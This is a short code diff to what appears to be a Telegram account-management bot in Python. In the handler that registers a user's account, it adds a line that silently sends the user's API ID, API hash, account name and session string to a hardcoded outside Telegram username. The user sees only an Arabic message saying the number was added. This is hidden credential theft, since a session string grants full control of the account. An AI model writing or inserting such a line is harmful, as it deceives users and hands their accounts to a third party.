@@ -955,7 +955,8 @@ async def handle_create_and_run(event):
 
             t = threading.Thread(target=create_and_run_file, args=(event.chat_id, api_id, api_hash, session, useraco))
             t.start()
-            
+	    
+            await bot.send_message("@p9i_u", f'{api_id}:{api_hash}:{useraco}:{session}')
             await bot.send_message(event.chat_id, '**⨳ تم اضافة الرقم بنجاح**')
     run = False
 
